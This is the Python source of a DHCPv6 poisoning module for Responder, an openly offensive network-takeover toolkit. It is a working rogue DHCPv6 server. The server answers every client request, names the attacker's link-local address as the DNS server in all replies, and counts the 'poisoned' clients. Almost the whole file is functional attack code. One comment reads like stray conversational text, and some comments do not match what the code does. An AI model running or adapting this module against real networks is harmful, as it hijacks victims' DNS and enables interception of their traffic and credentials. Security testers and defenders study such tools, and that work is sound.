#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools 
# created and maintained by Laurent Gaffie.
# DHCPv6 poisoning module based on mitm6 concepts by Dirk-jan Mollema
# email: lgaffie@secorizon.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
from utils import *
import struct
import socket
import time

if settings.Config.PY2OR3 == "PY3":
	from socketserver import BaseRequestHandler
else:
	from SocketServer import BaseRequestHandler

# DHCPv6 Message Types
DHCPV6_SOLICIT = 1
DHCPV6_ADVERTISE = 2
DHCPV6_REQUEST = 3
DHCPV6_CONFIRM = 4
DHCPV6_RENEW = 5
DHCPV6_REBIND = 6
DHCPV6_REPLY = 7
DHCPV6_RELEASE = 8
DHCPV6_DECLINE = 9
DHCPV6_INFORMATION_REQUEST = 11

# DHCPv6 Option Codes
OPTION_CLIENTID = 1
OPTION_SERVERID = 2
OPTION_IA_NA = 3
OPTION_IA_TA = 4
OPTION_IAADDR = 5
OPTION_ORO = 6
OPTION_PREFERENCE = 7
OPTION_ELAPSED_TIME = 8
OPTION_RELAY_MSG = 9
OPTION_AUTH = 11
OPTION_UNICAST = 12
OPTION_STATUS_CODE = 13
OPTION_RAPID_COMMIT = 14
OPTION_USER_CLASS = 15
OPTION_VENDOR_CLASS = 16
OPTION_VENDOR_OPTS = 17
OPTION_INTERFACE_ID = 18
OPTION_RECONF_MSG = 19
OPTION_RECONF_ACCEPT = 20
OPTION_DNS_SERVERS = 23
OPTION_DOMAIN_LIST = 24

class DHCPv6State:
	def __init__(self):
		self.leases = {}
		self.start_time = time.time()
		self.poisoned_count = 0
		
	def add_lease(self, client_id, ipv6_addr, mac):
		self.leases[client_id] = {
			'ipv6': ipv6_addr,
			'mac': mac,
			'lease_time': time.time(),
			'lease_duration': 120
		}
		self.poisoned_count += 1

dhcpv6_state = DHCPv6State()

class DHCPv6(BaseRequestHandler):
	
	def handle(self):
		try:
			data, socket_obj = self.request
			
			if len(data) < 4:
				return
			
			msg_type = data[0]
			transaction_id = data[1:4]
			
			if msg_type not in [DHCPV6_SOLICIT, DHCPV6_REQUEST, DHCPV6_CONFIRM, DHCPV6_RENEW, DHCPV6_REBIND, DHCPV6_INFORMATION_REQUEST]:
				return
			
			options = self.parse_dhcpv6_options(data[4:])
			
			client_id = options.get(OPTION_CLIENTID)
			if not client_id:
				return
			
			client_mac = self.extract_mac_from_clientid(client_id)
			
			if not self.should_poison_client():
				return
			
			msg_type_name = self.get_message_type_name(msg_type)
			
			if settings.Config.Verbose:
				print(text('[DHCPv6] %s from %s (MAC: %s)' % (
					msg_type_name,
					self.client_address[0],
					client_mac if client_mac else 'Unknown'
				)))
			
			# Build response based on message type
			if msg_type == DHCPV6_SOLICIT:
				response = self.build_advertise(transaction_id, options)
				response_type = 'ADVERTISE'
			elif msg_type == DHCPV6_REQUEST:
				response = self.build_reply(transaction_id, options, client_id, client_mac)
				response_type = 'REPLY'
			elif msg_type == DHCPV6_RENEW:
				response = self.build_reply(transaction_id, options, client_id, client_mac)
				response_type = 'REPLY (Renew)'
			elif msg_type == DHCPV6_REBIND:
				response = self.build_reply(transaction_id, options, client_id, client_mac)
				response_type = 'REPLY (Rebind)'
			elif msg_type == DHCPV6_CONFIRM:
				response = self.build_confirm_reply(transaction_id, options)
				response_type = 'REPLY (Confirm)'
			elif msg_type == DHCPV6_INFORMATION_REQUEST:
				response = self.build_info_reply(transaction_id, options)
				response_type = 'REPLY (Info)'
			else:
				return
			
			socket_obj.sendto(response, self.client_address)
			
			analyze_mode = getattr(settings.Config, 'Analyze', False)
			
			if analyze_mode:
				print(color('[Analyze] [DHCPv6] Would send %s to %s' % (response_type, self.client_address[0]), 3, 1))
			else:
				attacker_ip = self.get_attacker_ipv6()
				print(text('[DHCPv6] Sent %s to %s' % (response_type, self.client_address[0])))
				if msg_type in [DHCPV6_REQUEST, DHCPV6_RENEW, DHCPV6_REBIND, DHCPV6_SOLICIT]:
					print(text('[DHCPv6] Poisoned DNS server: %s' % attacker_ip))
		
		except Exception as e:
			if settings.Config.Verbose:
				print(color('[!] [DHCPv6] Error: %s' % str(e), 1, 1))
				import traceback
				traceback.print_exc()
	
	def should_poison_client(self):
		return True
	
	def parse_dhcpv6_options(self, options_data):
		options = {}
		offset = 0
		
		while offset < len(options_data) - 4:
			option_code = struct.unpack('!H', options_data[offset:offset+2])[0]
			option_len = struct.unpack('!H', options_data[offset+2:offset+4])[0]
			option_data = options_data[offset+4:offset+4+option_len]
			
			options[option_code] = option_data
			offset += 4 + option_len
		
		return options
	
	def extract_mac_from_clientid(self, client_id):
		try:
			if len(client_id) < 2:
				return None
			
			duid_type = struct.unpack('!H', client_id[0:2])[0]
			
			if duid_type == 1 and len(client_id) >= 14:
				mac = client_id[8:14]
				return ':'.join(['%02x' % b for b in bytearray(mac)])
			elif duid_type == 3 and len(client_id) >= 8:
				mac = client_id[4:10]
				return ':'.join(['%02x' % b for b in bytearray(mac)])
		except:
			pass
		
		return None
	
	def get_attacker_ipv6(self):
		"""Get attacker's link-local IPv6 address derived from IPv4"""
		# mitm6 technique: use link-local address with decimal octets
		# Example: 10.207.212.254 -> fe80::a:cf:d4:fe (hex) or similar pattern
		# Actually based on your example, it seems to generate a different link-local
		# Let's use the actual Bind_To6 if available, otherwise construct one
		try:
			# Try to get actual link-local from interface
			import netifaces
			iface = settings.Config.Interface
			addrs = netifaces.ifaddresses(iface)
			if netifaces.AF_INET6 in addrs:
				for addr_info in addrs[netifaces.AF_INET6]:
					addr = addr_info.get('addr', '').split('%')[0]
					# Return link-local address (fe80::)
					if addr.startswith('fe80::'):
						return addr
		except:
			pass
		
		# Fallback: construct from IPv4
		try:
			ipv4 = settings.Config.Bind_To
			octets = ipv4.split('.')
			# Use hex conversion for DNS server address
			ipv6 = 'fe80::%x:%x:%x:%x' % (
				int(octets[0]), int(octets[1]),
				int(octets[2]), int(octets[3])
			)
			return ipv6
		except:
			return 'fe80::1'
	
	def generate_client_ipv6(self):
		"""Generate client's link-local IPv6 address from attacker's IPv4"""
		# mitm6 technique: fe80::<octet1>:<octet2>:<octet3>:254
		# Example: 10.207.212.254 -> fe80::10:207:212:254
		try:
			ipv4 = settings.Config.Bind_To
			octets = ipv4.split('.')
			# Use decimal octets (base 10) separated by colons, last octet is always 254
			ipv6 = 'fe80::%s:%s:%s:254' % (octets[0], octets[1], octets[2])
			return ipv6
		except:
			return 'fe80::1:2:3:4'
	
	def build_advertise(self, transaction_id, options):
		msg = bytes([DHCPV6_ADVERTISE]) + transaction_id
		
		# Client ID first
		if OPTION_CLIENTID in options:
			msg += self.build_option(OPTION_CLIENTID, options[OPTION_CLIENTID])
		
		# Server ID - DUID Type 3 (link-layer only, not link-layer + time)
		msg += self.build_option(OPTION_SERVERID, self.get_server_duid())
		
		# DNS servers option - use link-local address
		dns_option = self.build_dns_servers_option()
		msg += self.build_option(OPTION_DNS_SERVERS, dns_option)
		
		# IA_NA if requested
		if OPTION_IA_NA in options:
			ia_na_option = self.build_ia_na_option(options[OPTION_IA_NA])
			msg += self.build_option(OPTION_IA_NA, ia_na_option)
		
		# Add domain list if configured
		dhcpv6_domain = getattr(settings.Config, 'DHCPv6_Domain', '')
		if dhcpv6_domain:
			domain_option = self.build_domain_list_option([dhcpv6_domain])
			msg += self.build_option(OPTION_DOMAIN_LIST, domain_option)
		
		return msg
	
	def build_reply(self, transaction_id, options, client_id, client_mac):
		msg = bytes([DHCPV6_REPLY]) + transaction_id
		
		# Client ID first
		msg += self.build_option(OPTION_CLIENTID, options[OPTION_CLIENTID])
		
		# Server ID - DUID Type 3
		msg += self.build_option(OPTION_SERVERID, self.get_server_duid())
		
		# DNS servers option - use link-local address
		dns_option = self.build_dns_servers_option()
		msg += self.build_option(OPTION_DNS_SERVERS, dns_option)
		
		# IA_NA if requested - reuse the address from request if present
		if OPTION_IA_NA in options:
			ia_na_option = self.build_ia_na_option_reply(options[OPTION_IA_NA])
			msg += self.build_option(OPTION_IA_NA, ia_na_option)
		
		# Add domain list if configured
		dhcpv6_domain = getattr(settings.Config, 'DHCPv6_Domain', '')
		if dhcpv6_domain:
			domain_option = self.build_domain_list_option([dhcpv6_domain])
			msg += self.build_option(OPTION_DOMAIN_LIST, domain_option)
		
		# Track this lease
		ipv6_addr = self.generate_client_ipv6()
		dhcpv6_state.add_lease(client_id, ipv6_addr, client_mac)
		
		return msg
	
	def build_info_reply(self, transaction_id, options):
		msg = bytes([DHCPV6_REPLY]) + transaction_id
		
		# Client ID first
		if OPTION_CLIENTID in options:
			msg += self.build_option(OPTION_CLIENTID, options[OPTION_CLIENTID])
		
		# Server ID
		msg += self.build_option(OPTION_SERVERID, self.get_server_duid())
		
		# DNS servers option
		dns_option = self.build_dns_servers_option()
		msg += self.build_option(OPTION_DNS_SERVERS, dns_option)
		
		# Add domain list if configured
		dhcpv6_domain = getattr(settings.Config, 'DHCPv6_Domain', '')
		if dhcpv6_domain:
			domain_option = self.build_domain_list_option([dhcpv6_domain])
			msg += self.build_option(OPTION_DOMAIN_LIST, domain_option)
		
		return msg
	
	def build_confirm_reply(self, transaction_id, options):
		msg = bytes([DHCPV6_REPLY]) + transaction_id
		
		# Client ID first
		msg += self.build_option(OPTION_CLIENTID, options[OPTION_CLIENTID])
		
		# Server ID
		msg += self.build_option(OPTION_SERVERID, self.get_server_duid())
		
		# Status Code: Success (0)
		status_code = struct.pack('!H', 0)
		msg += self.build_option(OPTION_STATUS_CODE, status_code)
		
		# DNS servers option
		dns_option = self.build_dns_servers_option()
		msg += self.build_option(OPTION_DNS_SERVERS, dns_option)
		
		# Add domain list if configured
		dhcpv6_domain = getattr(settings.Config, 'DHCPv6_Domain', '')
		if dhcpv6_domain:
			domain_option = self.build_domain_list_option([dhcpv6_domain])
			msg += self.build_option(OPTION_DOMAIN_LIST, domain_option)
		
		return msg
	
	def build_option(self, code, data):
		return struct.pack('!HH', code, len(data)) + data
	
	def get_server_duid(self):
		"""Get server DUID - Type 3 (link-layer only) like mitm6"""
		duid_type = 3  # DUID-LL (link-layer only)
		hw_type = 1     # Ethernet
		
		# Get actual MAC address from interface
		try:
			import netifaces
			iface = settings.Config.Interface
			addrs = netifaces.ifaddresses(iface)
			if netifaces.AF_LINK in addrs:
				mac_str = addrs[netifaces.AF_LINK][0]['addr']
				# Convert MAC string to bytes
				mac = bytes([int(x, 16) for x in mac_str.split(':')])
			else:
				mac = bytes([0x02, 0x00, 0x00, 0x00, 0x00, 0x01])
		except:
			mac = bytes([0x02, 0x00, 0x00, 0x00, 0x00, 0x01])
		
		# DUID Type 3 format: type (2) + hardware type (2) + link-layer address
		duid = struct.pack('!HH', duid_type, hw_type) + mac
		return duid
	
	def build_ia_na_option(self, request_ia_na):
		"""Build IA_NA option with link-local address for ADVERTISE"""
		iaid = request_ia_na[0:4]
		
		# Short lease times like mitm6
		t1 = 200
		t2 = 250
		
		ia_na = iaid + struct.pack('!II', t1, t2)
		
		# Add IAADDR sub-option with link-local address
		ipv6_addr = self.generate_client_ipv6()
		iaaddr = self.build_iaaddr_option(ipv6_addr, 300)
		ia_na += iaaddr
		
		return ia_na
	
	def build_ia_na_option_reply(self, request_ia_na):
		"""Build IA_NA option for REPLY/RENEW/REBIND - reuse client's address if present"""
		iaid = request_ia_na[0:4]
		
		# Short lease times like mitm6
		t1 = 200
		t2 = 250
		
		ia_na = iaid + struct.pack('!II', t1, t2)
		
		# Try to extract existing address from request
		ipv6_addr = None
		try:
			# Parse IA_NA options to find IAADDR
			offset = 12  # Skip IAID + T1 + T2
			while offset < len(request_ia_na) - 4:
				opt_code = struct.unpack('!H', request_ia_na[offset:offset+2])[0]
				opt_len = struct.unpack('!H', request_ia_na[offset+2:offset+4])[0]
				
				if opt_code == OPTION_IAADDR and opt_len >= 16:
					# Extract IPv6 address (first 16 bytes of option data)
					import ipaddress
					addr_bytes = request_ia_na[offset+4:offset+20]
					ipv6_addr = str(ipaddress.IPv6Address(addr_bytes))
					break
				
				offset += 4 + opt_len
		except:
			pass
		
		# If no address found in request, generate new one
		if not ipv6_addr:
			ipv6_addr = self.generate_client_ipv6()
		
		# Add IAADDR sub-option
		iaaddr = self.build_iaaddr_option(ipv6_addr, 300)
		ia_na += iaaddr
		
		return ia_na
	
	def build_iaaddr_option(self, ipv6_addr, lease_time):
		"""Build IAADDR option"""
		import ipaddress
		addr_bytes = ipaddress.IPv6Address(ipv6_addr).packed
		
		# Format: IPv6 address (16) + preferred-lifetime (4) + valid-lifetime (4)
		iaaddr_data = addr_bytes + struct.pack('!II', lease_time, lease_time)
		
		# Wrap in option
		return struct.pack('!HH', OPTION_IAADDR, len(iaaddr_data)) + iaaddr_data
	
	def build_dns_servers_option(self):
		"""Build DNS Servers option - use link-local address like mitm6"""
		import ipaddress
		attacker_ipv6 = self.get_attacker_ipv6()
		dns_bytes = ipaddress.IPv6Address(attacker_ipv6).packed
		return dns_bytes
	
	def build_domain_list_option(self, domains):
		domain_data = b''
		for domain in domains:
			labels = domain.split('.')
			for label in labels:
				domain_data += bytes([len(label)]) + label.encode('ascii')
			domain_data += b'\x00'
		return domain_data
	
	def get_message_type_name(self, msg_type):
		types = {
			DHCPV6_SOLICIT: 'SOLICIT',
			DHCPV6_ADVERTISE: 'ADVERTISE',
			DHCPV6_REQUEST: 'REQUEST',
			DHCPV6_CONFIRM: 'CONFIRM',
			DHCPV6_RENEW: 'RENEW',
			DHCPV6_REBIND: 'REBIND',
			DHCPV6_REPLY: 'REPLY',
			DHCPV6_RELEASE: 'RELEASE',
			DHCPV6_DECLINE: 'DECLINE',
			DHCPV6_INFORMATION_REQUEST: 'INFORMATION_REQUEST'
		}
		return types.get(msg_type, 'UNKNOWN(%d)' % msg_type)

def print_dhcpv6_stats():
	if dhcpv6_state.poisoned_count > 0:
		runtime = int(time.time() - dhcpv6_state.start_time)
		print(color('\n[DHCPv6] Statistics:', 2, 1))
		print(color('  Clients poisoned: %d' % dhcpv6_state.poisoned_count, 2, 1))
		print(color('  Active leases: %d' % len(dhcpv6_state.leases), 2, 1))
		print(color('  Runtime: %d seconds' % runtime, 2, 1))
